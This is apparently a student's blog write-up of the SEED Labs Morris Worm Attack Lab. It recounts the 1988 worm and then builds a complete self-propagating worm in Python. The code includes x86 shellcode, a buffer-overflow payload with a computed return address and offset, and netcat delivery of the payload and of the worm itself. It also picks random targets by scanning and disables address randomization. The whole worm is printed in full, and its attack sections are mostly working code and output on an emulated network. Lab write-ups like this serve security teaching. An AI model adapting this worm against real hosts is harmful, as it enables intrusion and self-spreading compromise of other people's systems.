---
layout: post
title: "Worm Attack: Morris Worm"
excerpt: Robert Tappan Morris created the Morris worm in 1988. He claimed that the worm was not intended to cause harm but rather to gauge the size of the internet. The worm ended up causing widespread damage and disruption as it quickly got out of control due to its ability to replicate and spread rapidly. The worm started to congest network traffic as it continued to replicate, leading to system crashes and slowdowns.
categories: [bof, worm, malware]
---

![Morris worm]({{ site.baseurl }}/images/featured-images/morris-worm.jpg)

A computer worm is a type of malware that is designed to self-replicate across computer networks without needing any human interaction. It can propagate rapidly, causing widespread damage. One such case is that of the Morris worm.

Robert Tappan Morris created the Morris worm in 1988. He claimed that the worm was not intended to cause harm but rather to gauge the size of the internet. The worm ended up causing widespread damage and disruption as it quickly got out of control due to its ability to replicate and spread rapidly. The worm started to congest network traffic as it continued to replicate, leading to system crashes and slowdowns.

While the Morris worm is old, the techniques used by most worms today are still the same and involve two main parts: attack and self-duplication.

<details>
<summary><b>SeedLabs: Morris Worm Attack Lab</b></summary>
<div markdown="1">

- [Morris Worm Attack Lab](https://seedsecuritylabs.org/Labs_20.04/Files/Morris_Worm/Morris_Worm.pdf)

___
</div></details>

<details>
<summary>Lab Notes</summary>
<div markdown="1">

Address randomization is disabled.
```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```
</div>
</details>

<br>

### Attacking the First Target

This task focuses on the attacking part of the Morris worm. One of the vulnerabilities exploited by the Morris worm was a buffer-overflow vulnerability. The lab includes vulnerable servers that have a buffer-overflow vulnerability. The goal of this task is to exploit this vulnerability so we can run our malicious code on the server.

The author of the lab has provided a skeleton code that will be edited and used to carry out the attack.

<details>
<summary>Morris Worm Attack Lab Skeleton Code</summary>
<div markdown="1">

```python
#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   "                                                            "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0  # Need to change
   offset = 0  # Need to change

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   return '10.151.0.71'


############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)


    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
```
</div>
</details>


#### Creating the badfile

The attack involves overflowing a buffer in a function in the vulnerable program. To successfully execute a buffer-overflow attack, parameters like the stack frame pointer address and the buffer address of the vulnerable function need to be known. This can be obtained by debugging the program. However, because this lab is not necessarily about buffer overflow but about observing a worm in action, the author has designed the lab in such a way that these values are made available to the student when running the program normally.

```bash
echo hello | nc -w2 10.153.0.72 9090
```

![task-1-a](https://github.com/iukadike/blog/assets/58455326/170133b1-2a55-4034-af5e-6e56ac61357f)

We will use the information gotten from the output of the program to edit the skeleton code so that a buffer-overflow attack happens.

```python
# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 12
   offset = 112 + 4

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)
```

<details>
<summary>Brief Code Explanation</summary>
<div markdown="1">

The return address is after the frame pointer. This means that the return address is ebp+4 (for 32-bit). To find the offset, we have to find the distance of the return address from the start of the buffer. This is calculated as `ebp-buffer+4`

We have chosen the address to store in our return address as ebp+12 because we need the return address value to be the address of one of the NOPs.
</div>
</details>

To test the attack, we simply run the attack program. If the attack is successful, a smiley face will be printed on the target machine. As seen from the screenshot below, the attack was successful.

![task-1-b](https://github.com/iukadike/blog/assets/58455326/baa21848-52a5-4afd-8a4a-5de34e07cf85)


<br>

### Self Duplication

The distinct property of a worm is that it self-replicates by copying itself from one machine to another. There are two typical strategies used by worms for replication:
- All the code is contained inside the shellcode payload.
- The attack code is divided into two parts:
  -  an initial payload that is the shellcode used to exploit the buffer-overflow vulnerability
  -  a more complex payload (written using any language) that the shellcode fetches.

For our worm to achieve self-dupplication, we would further modify the skeleton code as follows:

```python
shellcode= (
   ... # existing code fragment
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py;                                    "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')
```

```python
# Launch the attack on other servers
while True:
    ... # existing code fragment

    # Make a copy of the worm on the target host
    subprocess.run([f"cat worm.py | nc -w3 {targetIP} 8000"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10) 

    # Remove this line if you want to continue attacking others
    exit(0)
```

Now, when the buffer-overflow vulnerability is exploited, our worm should be successfully copied. We can confirm by navigating to the directory where the worm was copied to.

![task-2-a](https://github.com/iukadike/blog/assets/58455326/26c9ed2b-89bf-4ecf-b868-dbeb9bf5b31b)

![task-2-b](https://github.com/iukadike/blog/assets/58455326/8290920a-32ad-468d-901c-28c8574ceef2)


<br>

### Propagation

After the previous task, the worm has crawled (copied) itself from our computer to the first target. We, however, want the worm to keep crawling to other computers.

This task involves randomly generating an IP address and checking if the host is alive before launching the attack. The IP address will be randomly generated with the following pattern: `10.X.0.Y`, where X ranges from 151 to 155 and Y ranges from 70 to 80.

For our worm to achieve self-dupplication, we would further modify the skeleton code as follows:

```python
shellcode= (
   ... # existing code fragment
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py && python3 worm.py;                 "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')
```

```python
# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      X = randint(151, 155)
      Y = randint(70, 80)
      ipaddr = f"10.{X}.0.{Y}"
      try:
         subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
         print(f"***{ipaddr} is alive, launch the attack", flush=True)
         return ipaddr
      except subprocess.CalledProcessError:
         print(f"{ipaddr} is not alive", flush=True)
```

```python
# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    ... # existing code fragment

    # Remove this line if you want to continue attacking others
    #exit(0)
```

Now, when the buffer-overflow vulnerability is exploited, not only is our worm copied, it also propagates. We can confirm by viewing the internet map provided in the lab.

![task-3-a](https://github.com/iukadike/blog/assets/58455326/483a2488-38bd-4e3f-a93e-b85ff2d65404)

![task-3-b](https://github.com/iukadike/blog/assets/58455326/066ddbbe-6b3c-415b-8d87-5db1e56093e9)


<br>

### Preventing Self Infection

To prevent our worm from running uncontrolled, we would need to put a check in place so that once a computer is compromised and an instance of the worm is already running, another instance of the worm will not run in a separate process.
This task involves implementing a sort of checking mechanism in the worm code to ensure that only one instance of the worm can run on a compromised computer.

In order to implement a checking mechanism for our worm, we would further modify the skeleton code as follows:

```python
# Function to check to make sure this istance is a fresh instance
def checkInstance():
      wormProcess = subprocess.check_output(["ps -ef | grep '0 python3 worm.py'"], shell=True).decode()
      wormProcess = wormProcess.rstrip().split('\n')
      if len(wormProcess) > 3:
         print("There is already a running instance. Exiting.", flush=True)
         exit(0)

# Check if istance is already running
checkInstance()
```

I have chosen to use `ps` to check if the program is already running. I have also decided to check if the result gotten by `ps` is greater than three because:
- the worm.py program itself = 1 positive result
- running the Python subprocess function = 1 positive result
- running `grep` = 1 positive result

We can verify this by modifying the code to `if len(wormProcess) == 3` to simulate the condition has been met and printing out debug information.

![task-4-a](https://github.com/iukadike/blog/assets/58455326/46f271df-3270-43a9-b442-8aff48913628)

Thus, if the results are higher, we know that the computer is already infected; therefore, kill the process because it is a new one.

We can confirm the code works by viewing the internet map provided in the lab. The video speed is 4x.

[task-4-b.webm](https://github.com/iukadike/blog/assets/58455326/966f01a9-e0fe-4b48-83e3-89b985897af8)

<video src="https://github-production-user-asset-6210df.s3.amazonaws.com/58455326/265040055-966f01a9-e0fe-4b48-83e3-89b985897af8.webm" controls="controls" style="max-width: 740px;">
</video>

<br>

###  Releasing the Worm on the Mini Internet

<details>
<summary>Complete Worm Code</summary>
<div markdown="1">

```python
#!/bin/env python3
import sys
import os
import time
import subprocess
from random import randint

# You can use this shellcode to run any command you want
shellcode= (
   "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
   "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
   "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
   "\xff\xff\xff"
   "AAAABBBBCCCCDDDD" 
   "/bin/bash*"
   "-c*"
   # You can put your commands in the following three lines. 
   # Separating the commands using semicolons.
   # Make sure you don't change the length of each line. 
   # The * in the 3rd line will be replaced by a binary zero.
   " echo '(^_^) Shellcode is running (^_^)';                   "
   " nc -lnv 8000 > worm.py && python3 worm.py;                 "
   "                                                           *"
   "123456789012345678901234567890123456789012345678901234567890"
   # The last line (above) serves as a ruler, it is not used
).encode('latin-1')


# Create the badfile (the malicious payload)
def createBadfile():
   content = bytearray(0x90 for i in range(500))
   ##################################################################
   # Put the shellcode at the end
   content[500-len(shellcode):] = shellcode

   ret    = 0xffffd5f8 + 12
   offset = 112 + 4

   content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
   ##################################################################

   # Save the binary code to file
   with open('badfile', 'wb') as f:
      f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive. 
def getNextTarget():
   while True:
      X = randint(151, 180)
      Y = randint(70, 100)
      ipaddr = f"10.{X}.0.{Y}"
      try:
         subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
         print(f"***{ipaddr} is alive, launch the attack", flush=True)
         return ipaddr
      except subprocess.CalledProcessError:
         print(f"{ipaddr} is not alive", flush=True)
      
###############################################################
# Check to make sure this istance is a fresh instance
def checkInstance():
      wormProcess = subprocess.check_output(["ps -ef | grep '0 python3 worm.py'"], shell=True).decode()
      wormProcess = wormProcess.rstrip().split('\n')
      if len(wormProcess) > 3:
         print("There is already a running instance. Exiting.", flush=True)
         exit(0)

############################################################### 

print("The worm has arrived on this host ^_^", flush=True)

# This is for visualization. It sends an ICMP echo message to 
# a non-existing machine every 2 seconds.
subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)

# Create the badfile 
createBadfile()

# Check of istance is already running
checkInstance()

# Launch the attack on other servers
while True:
    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(1)

    # Make a copy of the worm on the target host
    subprocess.run([f"cat worm.py | nc -w3 {targetIP} 8000"], shell=True)

    # Sleep for 10 seconds before attacking another host
    time.sleep(10)

    # Remove this line if you want to continue attacking others
    #exit(0)
```
</div>
</details>

This task involves switching to a larger internet provided in the lab. The purpose of this task is to see how the worm spreads on a more realistic emulated internet. The mini-internet is comprised of about 240 hosts.

For this task,the IP address will be randomly generated with the following pattern: `10.X.0.Y`, where X ranges from 151 to 180 and Y ranges from 70 to 100. The worm will be released on one host, `10.151.0.71` and observed on the internet map as it propagates.

Hosts `10.150.0.Y` will be used as a control group. These hosts will be exempt from infection. The video speed is 8x.

[task-5.webm](https://github.com/iukadike/blog/assets/58455326/39fd7fda-3070-4ce0-9610-a68ffda60d65)

<video src="https://github-production-user-asset-6210df.s3.amazonaws.com/58455326/265040162-39fd7fda-3070-4ce0-9610-a68ffda60d65.webm" controls="controls" style="max-width: 740px;">
</video>

The hosts that did not flash in the video belong to the control group.

<br>

Thanks for reading...





